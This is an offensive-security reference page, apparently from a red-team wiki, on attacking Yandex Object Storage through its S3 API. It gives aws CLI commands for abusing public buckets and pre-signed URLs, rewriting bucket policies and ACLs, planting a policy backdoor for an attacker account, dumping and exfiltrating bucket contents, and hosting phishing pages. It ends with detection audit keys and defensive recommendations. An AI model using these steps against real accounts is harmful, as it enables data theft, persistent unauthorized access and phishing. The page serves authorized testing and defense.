# Object Storage (S3-Compatible)

## Overview

Yandex Object Storage is an AWS S3-compatible object storage service. It uses static access keys, supports bucket policies, ACLs, pre-signed URLs, server-side encryption, website hosting, and versioning. The S3-compatible API means standard AWS tools work directly.

## Initial Access

### Public Buckets

Buckets with `system:allUsers` ACL or public website hosting expose contents anonymously:

```bash
# Direct S3 access
aws s3 ls s3://<bucket> --endpoint-url https://storage.yandexcloud.net --no-sign-request

# Website hosting URL format
https://<bucket>.website.yandexcloud.net/
```

### Pre-Signed URL Abuse

Pre-signed URLs can grant temporary access (up to 7 days) without credentials:

```bash
aws s3 presign s3://<bucket>/file --expires-in 604800 \
  --endpoint-url https://storage.yandexcloud.net
```

Leaked pre-signed URLs in logs, emails, or chat provide direct object access.

---

## Credential Access

### Static Access Key Usage

```bash
export AWS_ACCESS_KEY_ID=YC...
export AWS_SECRET_ACCESS_KEY=YC...
aws s3 ls --endpoint-url https://storage.yandexcloud.net
```

### Bucket Policy Enumeration

```bash
aws s3api get-bucket-policy --bucket <bucket> --endpoint-url https://storage.yandexcloud.net
aws s3api get-bucket-acl --bucket <bucket> --endpoint-url https://storage.yandexcloud.net
```

---

## Privilege Escalation

### Bucket Policy Modification

With `storage.admin`:

```bash
aws s3api put-bucket-policy --bucket <bucket> \
  --endpoint-url https://storage.yandexcloud.net \
  --policy '{
    "Statement": [{
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": ["arn:aws:s3:::<bucket>/*"]
    }]
  }'
```

### ACL Modification

```bash
aws s3api put-bucket-acl --bucket <bucket> --acl public-read \
  --endpoint-url https://storage.yandexcloud.net
```

---

## Persistence

### Bucket Policy Backdoor

Grant attacker SA permanent access:

```json
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"CanonicalUser": "<attacker-sa-id>"},
    "Action": "s3:*",
    "Resource": ["arn:aws:s3:::<bucket>/*"]
  }]
}
```

### Object Versioning Abuse

If versioning is enabled, "deleted" objects still exist as non-current versions. Useful for:
- Recovering data the owner thought was deleted
- Hiding data in version history

---

## Post-Exploitation

### Full Bucket Dump

```bash
aws s3 ls --endpoint-url https://storage.yandexcloud.net  # list all buckets
aws s3 sync s3://<bucket> ./exfil/ --endpoint-url https://storage.yandexcloud.net
```

### SSE-KMS Decryption

If objects are encrypted with KMS and you have `kms.keys.encrypterDecrypter`:
- S3 automatically decrypts on download when you have the KMS role
- No additional steps needed beyond normal S3 download

### Website Hosting for Phishing

```bash
aws s3 website s3://<bucket> --index-document index.html \
  --endpoint-url https://storage.yandexcloud.net
```

Host phishing pages on a legitimate `yandexcloud.net` subdomain.

---

## Exfiltration

```bash
# Upload to attacker bucket
aws s3 cp /sensitive/data s3://<bucket>/exfil/ \
  --endpoint-url https://storage.yandexcloud.net

# Generate pre-signed download URL
aws s3 presign s3://<bucket>/exfil/data.tar.gz --expires-in 604800 \
  --endpoint-url https://storage.yandexcloud.net
```

---

## Enumeration

```bash
aws s3 ls --endpoint-url https://storage.yandexcloud.net
aws s3 ls s3://<bucket> --recursive --endpoint-url https://storage.yandexcloud.net
aws s3api get-bucket-versioning --bucket <bucket> --endpoint-url https://storage.yandexcloud.net
aws s3api get-bucket-encryption --bucket <bucket> --endpoint-url https://storage.yandexcloud.net
aws s3api get-bucket-logging --bucket <bucket> --endpoint-url https://storage.yandexcloud.net
```

---

## Detection

| Event | Audit Key |
|---|---|
| Bucket policy change | `storage.buckets.update` |
| ACL change | `storage.buckets.updateACL` |
| Bucket creation | `storage.buckets.create` |
| Large downloads | S3 access logs |

## Defensive Recommendations

1. Never use `system:allUsers` or `system:allAuthenticatedUsers` without explicit need
2. Enable bucket access logging
3. Use SSE-KMS for encryption at rest
4. Audit bucket policies and ACLs regularly
5. Disable public website hosting unless required
6. Use STS ephemeral keys instead of static keys
